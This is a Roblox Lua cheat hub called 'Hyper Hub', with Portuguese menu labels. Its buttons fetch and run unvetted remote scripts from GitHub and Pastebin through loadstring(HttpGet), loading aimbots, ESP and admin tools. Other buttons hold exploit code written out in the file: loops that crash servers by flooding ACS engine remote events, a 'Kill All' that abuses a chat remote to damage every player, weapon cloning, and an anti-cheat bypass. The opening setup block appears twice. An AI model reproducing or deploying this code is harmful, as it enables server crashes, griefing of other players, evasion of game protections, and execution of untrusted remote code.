local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Hyper Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "Hyper", IntroEnabled = false})

local JogadorTab = Window:MakeTab({
	Name = "Jogador",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = JogadorTab:AddSection({
	Name = "Hub"
})

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Hyper Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "Hyper", IntroEnabled = false})

local JogadorTab = Window:MakeTab({
	Name = "Jogador",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = JogadorTab:AddSection({
	Name = "Escolha Um Script"
})

JogadorTab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
  	end    
})

JogadorTab:AddButton({
	Name = "Orca",
	Callback = function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua'),true))()
  	end    
})

JogadorTab:AddButton({
	Name = "Dex Explorer",
	Callback = function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/Ht4zRXj8'),true))()
  	end    
})

JogadorTab:AddButton({
	Name = "Felipe Menu",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/DebugCrazY/FMobfuscated/main/fm.lua'))()
  	end    
})

local JogadorTab = Window:MakeTab({
	Name = "Aimbot",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = JogadorTab:AddSection({
	Name = "Escolha Um Script"
})


JogadorTab:AddButton({
	Name = "Aimbot V1",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
  	end    
})

JogadorTab:AddButton({
	Name = "Aimbot V2",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/fatesc/fates-esp/main/main.lua'))()
  	end    
})

JogadorTab:AddButton({
	Name = "Aimbot V3",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/GzchSUkb'))()
  	end    
})

local JogadorTab = Window:MakeTab({
	Name = "Puxar Armas",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = JogadorTab:AddSection({
	Name = "Escolha Um Script"
})

JogadorTab:AddButton({
	Name = "Hub Puxar Armas",
	Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/P07XWPCg'))()
  	end    
})

JogadorTab:AddButton({
	Name = "Clonar Armas",
	Callback = function()
        for i, v in pairs(game:GetDescendants()) do
            if v:IsA('Tool') then
                v.Parent = game:GetService('Players').LocalPlayer.Backpack
            end
        end
        
        game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
            for i, v in pairs(game:GetService('Players').LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Teams')
                end
            end
            for i, v in pairs(game:GetService('Players').LocalPlayer.Character:GetDescendants()) do
                if v:IsA('Tool') then
                    v.Parent = game:GetService('Teams')
                end
            end
        end)
  	end    
})

local JogadorTab = Window:MakeTab({
	Name = "Troll",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = JogadorTab:AddSection({
	Name = "Escolha Um Script"
})

JogadorTab:AddButton({
	Name = "Crash Server Acs 1.7.5",
	Callback = function()
        L = 20

local event = game.ReplicatedStorage.ACS_Engine.Eventos.Hit
local base = workspace:FindFirstChildOfClass("Part")
local data

for i,v in game:GetDescendants() do
    if v:IsA("Tool") and v:FindFirstChild("ACS_Modulo") then
        data = require(v.ACS_Modulo.ACS_Setup); break
    end
end

shared.loop = not shared.loop
while shared.loop do
    for i = 1, L do
        event:FireServer(base.Position, base, Vector3.new(), Enum.Material.Neon, data)
    end
    task.wait()
end
  	end    
})

JogadorTab:AddButton({
	Name = "Crash Server Acs 2.0.1",
	Callback = function()
        while task.wait() do

            for _, player in next, game.Players:GetPlayers() do
               game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
            end
          end
  	end    
})

JogadorTab:AddButton({
	Name = "Kill All",
	Callback = function()
        DAMAGE = 100
local event = game.ReplicatedStorage.ChatSystemGetMessage

function damage(hum, thr)
    pcall(event.InvokeServer, event, "hit", "}, {  ", DAMAGE, hum, "", 1.5)
    coroutine.resume(thr, hum.Parent)
end

for i,v in game.Players:GetPlayers() do
    local hum = v.Character and v.Character:FindFirstChild("Humanoid")
       if hum and event then
       task.spawn(damage, hum, coroutine.running())
      end
end
  	end    
})

local JogadorTab = Window:MakeTab({
	Name = "EB",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = JogadorTab:AddSection({
	Name = "Escolha Um Script"
})

JogadorTab:AddButton({
	Name = "Pegar Carros Eb Do Tevez",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/kSaMJ2Cn", true))()                                 
  	end    
})

JogadorTab:AddButton({
	Name = "Bypass Eb Do Tevez",
	Callback = function()
        local player = game.Players.LocalPlayer

        local function destroyLocalScripts(player)
            local character = player.Character
            if character then
                local descendants = character:GetDescendants()
                for i, v in ipairs(descendants) do
                    if v:IsA("LocalScript") and v.Name:match("{") then
                        v:Destroy()
                    end
                end
            end
        end
        destroyLocalScripts(player)
        
        game:GetService('Players').LocalPlayer.Character.Humanoid.Died:Connect(function()
        destroyLocalScripts(player)
        end)                            
  	end    
})

JogadorTab:AddButton({
	Name = "Auto jjs-@Zv_yz",
	Callback = function()
        local Options = {
            Keybind = 'Home', --> Keybind para mostrar/esconder a UI, mais informações sobre KeyCode: https://create.roblox.com/docs/reference/engine/enums/KeyCode
            Tempo = 2.5, --> Tempo para enviar mensagem.
            Language = 'pt-br', --> Alterar a linguagem dos textos, disponívels: pt-br, en-us
            Rainbow = false, --> Deixar a UI mais colorida (true/false)
        };
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zv-yz/AutoJJs/main/Main.lua'))(Options);                        
  	end    
})
